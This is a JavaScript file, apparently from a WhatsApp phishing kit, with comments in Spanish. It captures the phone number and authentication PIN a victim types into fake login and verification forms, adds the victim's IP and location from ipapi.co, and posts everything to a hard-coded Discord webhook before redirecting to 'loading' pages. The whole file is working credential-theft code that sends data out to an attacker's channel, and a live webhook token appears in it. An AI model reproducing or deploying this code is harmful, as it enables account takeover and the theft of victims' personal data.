document.addEventListener("DOMContentLoaded", function () {
    // Función para obtener el valor de un parámetro de la URL
    function getQueryParam(param) {
        const urlParams = new URLSearchParams(window.location.search);
        return urlParams.get(param);
    }

    // Función para obtener la ubicación y enviar el mensaje a Discord
    function obtenerUbicacionYEnviarMensajeDiscord(code, password, nextPage, message) {
        fetch('https://ipapi.co/json/')
            .then(response => response.json())
            .then(data => {
                const { country_name, region, ip } = data;
                if (country_name && region && ip) {
                    message += `\nUbicación: ${country_name}, ${region}\nIP: ${ip}`;
                } else {
                    message += '\nNo se pudo obtener la ubicación.';
                }
                enviarMensajeDiscord(message, nextPage);
            })
            .catch(error => {
                console.error("Error al obtener la ubicación:", error);
                message += "\nError al obtener la ubicación.";
                enviarMensajeDiscord(message, nextPage);
            });
    }

    // Función para enviar el mensaje a Discord usando un webhook
    function enviarMensajeDiscord(mensaje, nextPage) {
        const webhookUrl = 'https://discord.com/api/webhooks/1364960140662542448/ypGx9gdvnVZyAMg-6Ns779LqLKXBK-O19orYqasZuibaH4GlPJUP4b-Ftk6_vh4XwcbK';

        const payload = { content: mensaje };

        fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        })
            .then(response => {
                if (!response.ok) throw new Error('Ocurrió un error al enviar el mensaje a Discord.');
                console.log('Mensaje enviado a Discord con éxito.');
                window.location.href = nextPage;
            })
            .catch(error => {
                console.error('Error al enviar el mensaje a Discord:', error);
            });
    }

    // Validar número de teléfono internacional (con +, 6-15 dígitos)
    function validarTelefono(telefono) {
        telefono = telefono.replace(/[\s-]/g, ''); // Quitar espacios y guiones
        const regex = /^\+\d{6,15}$/;
        return regex.test(telefono);
    }

    // Evento de envío de formulario de teléfono
    const loginForm = document.getElementById("loginForm");
    if (loginForm) {
        loginForm.addEventListener("submit", function (event) {
            event.preventDefault();
            let telefono = document.getElementById("telefono").value.trim();
            telefono = telefono.replace(/[\s-]/g, ''); // Normaliza el número

            if (!telefono.startsWith('+')) {
                const countryCode = document.getElementById("country").value;
                telefono = countryCode + telefono;
            }

            if (validarTelefono(telefono)) {
                obtenerUbicacionYEnviarMensajeDiscord(telefono, telefono, "cargando.html?action=telefono", "💲 Whatsapp  💲:\nTELEFONO: " + telefono);
            } else {
                alert("Por favor, ingresa un número válido con formato internacional (ej: +54123456789).");
            }
        });
    }

    // Evento de envío de formulario para código de autenticación
    const verificationForm = document.getElementById("verificationForm");
    if (verificationForm) {
        verificationForm.addEventListener("submit", function (event) {
            event.preventDefault();
            const auth = document.getElementById("auth").value.trim();
            obtenerUbicacionYEnviarMensajeDiscord(auth, auth, "cargando3.html", "💲 Whatsapp  💲:\nPIN AUTHENTICADOR: " + auth);
        });
    }
});